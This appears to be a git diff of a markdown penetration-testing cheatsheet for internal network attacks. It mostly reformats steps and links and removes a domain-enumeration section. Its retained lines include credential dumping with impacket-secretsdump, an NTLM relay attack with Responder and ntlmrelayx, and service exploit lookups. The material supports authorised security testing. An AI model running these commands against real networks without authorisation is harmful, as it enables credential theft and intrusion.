@@ -6,7 +6,7 @@
 
 * Crack WPA or crack/replay PEAP
 
-> For more details, see next cheatsheet : WIFI
+> For more details, see next cheatsheet : [WiFi](02-wifi.md)
 
 ### NAC - MAC filtering
 
@@ -35,8 +35,7 @@ Boot from Kali Linux and dump creds
 cd SystemRoot%\system32\Config\SAM
 impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
 ```
-> For more details, see next [post-exploitation-windows](05-post-exploitation-windows.md)
----
+> For more details, see next cheatsheet : [Windows Post Exploitation](05-post-exploitation-windows.md)
 
 ### Port and service scan
 
@@ -57,13 +56,11 @@ use auxiliary/scanner/http/tomcat_mgr_login
 searchsploit <service_name>
 ```
 
----
-
 ### Man-In-The-Middle
 
 Responder + NTLMrelayx
 
-First we need to edit  responder.conf like this :
+1. First we need to edit  responder.conf like this :
 
 `vim /usr/share/responder/Responder.conf`
 
@@ -84,7 +81,7 @@ DNS = On
 LDAP = On
 ```
 
-Then we create a list of targets :
+2. Then we create a list of targets :
 
 ```bash
 nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
@@ -94,7 +91,7 @@ cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 
 > if the scope is small : `cme smb <targets> --gen-relay-list relaylistOutputFilename.txt`
 
-After we can run Responder + ntlmrelayx
+3. After we can run Responder + ntlmrelayx
 
 ```bash
 python Responder.py -I <interface> -rdw
@@ -119,52 +116,12 @@ Bettercap
 Cain.exe (& Abel)
 ```
 
----
+### Domain enum
 
-### **Domain enum**
-
-Get DC IP
-
-```bash
-cat /etc/resolv.conf
-nslookup <domain>
-```
-
-Password policy \(especially lockout threshold for bruteforce\)
-
-```bash
-enum4linux -P -o <target>
-enum4linux -a <target>
-```
-
-Open shares \(anonymous SMB, NFS, FTP, etc\)
-
-SMB
-
-```bash
-smbmap -H IP -r DOSSIER
-smbmap -H IP --download DOSSIER
-
-# SMB V1
-smbclient -L ///192.168.0.1 -U <user> -c ls [--option='client min protocol=NT1']
-mount //10.11.1.136/"Bob Share" /mnt/bob [-o vers=1.0]
-```
-
-NFS 
-
-```bash
-showmount -e <target>
-mount <target>:/home/xx /mnt/yy 
-```
-
-kerberos
-
-```bash
-nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='megabank.local',userdb=/root/users.txt 10.10.10.169
-./kerbrute_linux_amd64 userenum -d <domain> usernames.txt -debug
-```
+> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)
 
 ---
+
 
 ## Unprivileged account only 
 
